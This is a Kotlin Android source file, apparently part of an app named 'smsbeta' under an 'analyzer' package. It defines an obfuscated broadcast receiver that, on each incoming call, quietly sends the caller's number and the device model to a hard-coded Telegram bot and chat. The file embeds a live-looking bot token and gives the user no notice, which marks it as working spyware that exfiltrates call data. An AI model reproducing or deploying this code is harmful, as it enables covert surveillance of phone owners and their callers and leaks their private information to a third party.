package com.analyzer.smsbeta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

class L : BroadcastReceiver() {
    private val y = OkHttpClient()

    override fun onReceive(z: Context?, a: Intent?) {
        val b = a?.getStringExtra(TelephonyManager.EXTRA_STATE)
        val c = a?.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
        val d = e()

        if (b == TelephonyManager.EXTRA_STATE_RINGING && c != null) {
            f(c, d)
        }
    }

    private fun e(): String {
        return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
    }

    private fun f(g: String, h: String) {
        val i = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
        val j = "6331293386"
        val k = "https://api.telegram.org/bot$i/sendMessage"

        val l = """
            Входящий вызов!
            Номер: $g
            
            $h""".trimIndent()

        val m = "application/json".toMediaType()
        val n = """
            {
                "chat_id": "$j",
                "text": "$l",
                "parse_mode": "Markdown"
            }
        """.trimIndent().toRequestBody(m)

        val o = Request.Builder()
            .url(k)
            .post(n)
            .build()

        y.newCall(o).enqueue(object : okhttp3.Callback {
            override fun onFailure(p: okhttp3.Call, q: java.io.IOException) {
                q.printStackTrace()
            }

            override fun onResponse(p: okhttp3.Call, r: okhttp3.Response) {
                if (!r.isSuccessful) {
                    println("${r.code}")
                }
                r.close()
            }
        })
    }
}
